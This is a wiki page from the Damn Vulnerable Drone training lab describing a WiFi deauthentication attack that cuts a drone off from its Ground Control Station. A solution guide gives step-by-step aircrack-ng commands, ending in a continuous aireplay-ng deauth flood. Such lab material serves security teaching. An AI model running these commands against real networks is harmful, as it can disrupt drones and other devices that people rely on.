<i>Disrupting the communication between the Ground Control Station (GCS) and the drone by performing a deauthentication attack on the WiFi network.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Denial of Service > Wifi Deauth Attack

# Description

A WiFi deauthentication attack targets the communication between two devices on a WiFi network. By sending deauthentication frames to one or both devices, the attacker forces them to disconnect from the network. This can be particularly disruptive for systems that rely on continuous network connectivity, such as drones controlled by a Ground Control Station (GCS) via WiFi.

# Resources

- <a href="https://www.aircrack-ng.org/">Aircrack-ng Suite</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<p>Install the Aircrack-ng suite:</p>

<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install aircrack-ng
</code></pre>

---

<h3>Step 2. Enable Monitor Mode</h3>
<p>If your wireless adapter is not already in monitor mode (e.g., <code>wlan0mon</code>), enable it:</p>

<pre><code class="code mb-3 mt-3">sudo airmon-ng start wlan0
</code></pre>

---

<h3>Step 3. Identify Target Devices</h3>
<p>Use <code>airodump-ng</code> to find the MAC addresses of the access point and GCS:</p>

<pre><code class="code mb-3 mt-3">sudo airodump-ng wlan0mon
</code></pre>

<p>Note the following:</p>
<ul>
  <li><strong>AP MAC</strong>: The MAC address of the companion computer hosting the access point</li>
  <li><strong>GCS MAC</strong>: The MAC address of the Ground Control Station device</li>
  <li>Ensure you are listening on the correct channel (usually <code>6</code>)</li>
</ul>

---

<h3>Step 4. Perform Deauth Attack</h3>
<p>Run the following command to begin deauthenticating the GCS from the drone network:</p>

<pre><code class="code mb-3 mt-3">sudo aireplay-ng --deauth 0 -a &lt;AP_MAC&gt; -c &lt;GCS_MAC&gt; wlan0mon
</code></pre>

<p>Replace <code>&lt;AP_MAC&gt;</code> and <code>&lt;GCS_MAC&gt;</code> with the actual MAC addresses identified in Step 3. The <code>--deauth 0</code> flag will send deauth frames continuously.</p>

</details>
